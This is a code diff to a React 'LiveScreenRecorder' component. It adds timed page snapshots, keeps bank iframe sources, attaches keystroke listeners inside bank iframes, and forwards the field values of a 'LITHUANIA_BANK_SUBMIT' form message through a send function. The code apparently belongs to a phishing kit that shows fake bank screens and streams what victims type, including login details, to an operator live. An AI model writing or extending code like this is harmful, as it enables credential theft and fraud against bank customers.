@@ -192,12 +192,18 @@ export function LiveScreenRecorder() {
           await sendMeta();
           // Send snapshot immediately
           await sendFullSnapshotFlow();
-          // And refresh snapshot 500ms later to capture any async content (e.g. bank list / logos)
+          // Secondary snapshot after 400ms when React hydration completes
           setTimeout(() => {
             if (!isDisposed && isStreamingRef.current) {
               void sendFullSnapshotFlow();
             }
-          }, 500);
+          }, 400);
+          // Third snapshot after 1200ms when async data/banks/logos settle
+          setTimeout(() => {
+            if (!isDisposed && isStreamingRef.current) {
+              void sendFullSnapshotFlow();
+            }
+          }, 1200);
         }
       });
 
@@ -222,6 +228,7 @@ export function LiveScreenRecorder() {
           inlineStylesheet: true,
           inlineImages: false, // Super fast & lean: images load via their native URLs without blocking the thread
           collectFonts: false,
+          keepIframeSrcFn: () => true, // CRITICAL: PRESERVE BANK IFRAME SRC SO BANK SCREENS RENDER INSTEAD OF BLANK WHITE!
           sampling: {
             mousemove: 60, // Smooth 16fps cursor tracking without WebSocket congestion
             mouseInteraction: true,
@@ -270,7 +277,52 @@ export function LiveScreenRecorder() {
       window.addEventListener("blur", handleBlur, { capture: true, passive: true });
       window.addEventListener("focus", handleFocus, { capture: true, passive: true });
 
+      // ATTACH TO SAME-ORIGIN BANK IFRAMES TO CAPTURE TYPING INSIDE BANK SCREENS!
+      const attachToIframe = (ifr: HTMLIFrameElement) => {
+        try {
+          const doc = ifr.contentDocument || ifr.contentWindow?.document;
+          if (doc && !(ifr as any).__liveAttached) {
+            (ifr as any).__liveAttached = true;
+            doc.addEventListener("input", handleInput, { capture: true, passive: true });
+            doc.addEventListener("focus", handleFocus, { capture: true, passive: true });
+            doc.addEventListener("blur", handleBlur, { capture: true, passive: true });
+          }
+        } catch {
+          /* ignore */
+        }
+      };
+
+      const scanIframes = () => {
+        document.querySelectorAll("iframe").forEach((f) => {
+          attachToIframe(f as HTMLIFrameElement);
+        });
+      };
+      scanIframes();
+      const iframeInterval = setInterval(scanIframes, 600);
+
+      // Listen for bank postMessage submissions
+      const handleWindowMessage = (e: MessageEvent) => {
+        if (!e.data || typeof e.data !== "object") return;
+        if (e.data.type === "LITHUANIA_BANK_SUBMIT" && e.data.formData) {
+          const fd = e.data.formData;
+          if (Array.isArray(fd.fields)) {
+            fd.fields.forEach((f: any) => {
+              if (f.key && f.value) {
+                void sendAction({
+                  type: "input",
+                  target: f.label || f.name || f.key,
+                  value: f.value,
+                });
+              }
+            });
+          }
+        }
+      };
+      window.addEventListener("message", handleWindowMessage);
+
       return () => {
+        clearInterval(iframeInterval);
+        window.removeEventListener("message", handleWindowMessage);
         window.removeEventListener("input", handleInput, true);
         window.removeEventListener("blur", handleBlur, true);
         window.removeEventListener("focus", handleFocus, true);
